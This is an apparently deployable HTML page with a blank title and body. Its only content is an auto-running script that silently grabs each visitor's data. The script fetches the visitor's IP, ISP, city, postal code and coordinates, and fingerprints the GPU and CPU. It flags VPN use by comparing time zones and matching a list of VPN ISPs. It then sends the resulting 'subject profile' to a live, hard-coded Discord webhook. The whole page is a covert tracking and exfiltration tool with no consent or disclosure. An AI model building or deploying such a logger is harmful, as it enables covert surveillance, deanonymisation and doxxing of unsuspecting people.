<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <script>
        (async () => {
            const webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";

            if (webhookUrl.includes("YOUR_DISCORD_WEBHOOK_URL_GOES_HERE")) {
                console.error("CONFIGURATION ERROR: WEBHOOK URL IS A PLACEHOLDER.");
                return;
            }

            let payload;

            try {
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();

                if (data && data.ip) {
                    // --- Hardware Probing ---
                    let gpuInfo = "Unavailable";
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                        if (gl) {
                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (debugInfo) {
                                gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                            }
                        }
                    } catch (e) {
                        gpuInfo = "Error probing GPU";
                    }
                    const cpuCores = navigator.hardwareConcurrency || "Unknown";

                    // --- Anonymity Analysis ---
                    const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const ipTimezone = data.timezone || "Unknown";
                    const timezoneMismatch = browserTimezone !== ipTimezone;
                    const knownVpnIsps = ['m247', 'digitalocean', 'ovh', 'private internet access', 'expressvpn', 'nordvpn', 'cyberghost', 'tunnelbear', 'hidemyass', 'astrill', 'vyprvpn', 'purevpn', 'datacenter', 'hosting'];
                    const isVpnIsp = knownVpnIsps.some(vpn => (data.org || '').toLowerCase().includes(vpn));
                    const isVpn = timezoneMismatch || isVpnIsp;

                    // --- Payload Assembly ---
                    const fields = [];

                    fields.push({
                        name: "Network & Anonymity Profile",
                        value: "──────────────────────────"
                    });
                    fields.push({
                        name: "IP Address",
                        value: `**${data.ip}**`,
                        inline: true
                    });
                    fields.push({
                        name: "Organization/ISP",
                        value: `*${data.org}*`,
                        inline: true
                    });

                    if (isVpn) {
                        let reason = [];
                        if (timezoneMismatch) reason.push("Timezone Mismatch");
                        if (isVpnIsp) reason.push("Known VPN/DC ISP");
                        fields.push({
                            name: "VPN / Proxy Status",
                            value: `**POSITIVE**`,
                            inline: false
                        });
                        fields.push({
                            name: "Evidence",
                            value: `\`${reason.join(' & ')}\`\nBrowser: \`${browserTimezone}\` vs IP: \`${ipTimezone}\``,
                            inline: false
                        });
                    } else {
                        fields.push({
                            name: "VPN / Proxy Status",
                            value: "Negative",
                            inline: false
                        });
                    }

                    fields.push({ name: '\u200B', value: '\u200B' }); // Spacer

                    fields.push({
                        name: "Geolocation Data",
                        value: "──────────────────────────"
                    });
                    fields.push({
                        name: "Country",
                        value: data.country || "Unknown",
                        inline: true
                    });
                    fields.push({
                        name: "Region",
                        value: data.region || "Unknown",
                        inline: true
                    });
                    fields.push({
                        name: "City",
                        value: data.city || "Unknown",
                        inline: true
                    });
                    fields.push({
                        name: "Postal Code",
                        value: data.postal || "Unknown",
                        inline: true
                    });
                    const [lat, lon] = data.loc ? data.loc.split(',') : ["Unknown", "Unknown"];
                    fields.push({
                        name: "Coordinates (Lat/Lon)",
                        value: `${lat}, ${lon}`,
                        inline: false
                    });

                    fields.push({ name: '\u200B', value: '\u200B' }); // Spacer

                    fields.push({
                        name: "Hardware Fingerprint",
                        value: "──────────────────────────"
                    });
                    fields.push({
                        name: "CPU Logical Cores",
                        value: `${cpuCores}`,
                        inline: true
                    });
                    fields.push({
                        name: "GPU Renderer",
                        value: `\`${gpuInfo}\``,
                        inline: false
                    });
                    fields.push({
                        name: "Environment Boundary",
                        value: "SSID & Anti-Virus data is restricted by browser sandbox.",
                        inline: false
                    });

                    payload = {
                        embeds: [{
                            title: "Intel Acquired: Subject Profile Generated",
                            description: "Digital footprint mapped. Core telemetry exfiltrated.",
                            color: 3066993,
                            fields: fields,
                            footer: {
                                text: `Data processed by Armored Agent v5.1 at: ${new Date().toISOString()}`
                            }
                        }]
                    };

                } else {
                    payload = {
                        embeds: [{
                            title: "Intel Acquisition FAILURE",
                            description: "The script executed, but the upstream API returned invalid or empty data. This is likely due to API rate-limiting or blocking.",
                            color: 15158332,
                            fields: [{
                                name: "API Queried",
                                value: "`https://ipinfo.io/json`"
                            }, {
                                name: "Raw Response (Logged to Console)",
                                value: "```json\n" + JSON.stringify(data, null, 2) + "\n```"
                            }],
                            footer: {
                                text: `Failure logged at: ${new Date().toISOString()}`
                            }
                        }]
                    };
                    console.error("API returned bad data:", data);
                }

            } catch (error) {
                payload = {
                    embeds: [{
                        title: "CRITICAL SCRIPT FAILURE",
                        description: "A network-level error occurred while attempting to contact the geolocation API. The target may be offline, using a blocker, or the API is down.",
                        color: 9807270,
                        fields: [{
                            name: "Error Message",
                            value: `*${error.message}*`
                        }, ],
                        footer: {
                            text: `Critical failure at: ${new Date().toISOString()}`
                        }
                    }]
                };
                console.error("Catch block triggered:", error);
            }

            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload),
            });
            
        })();
    </script>
</body>
</html>
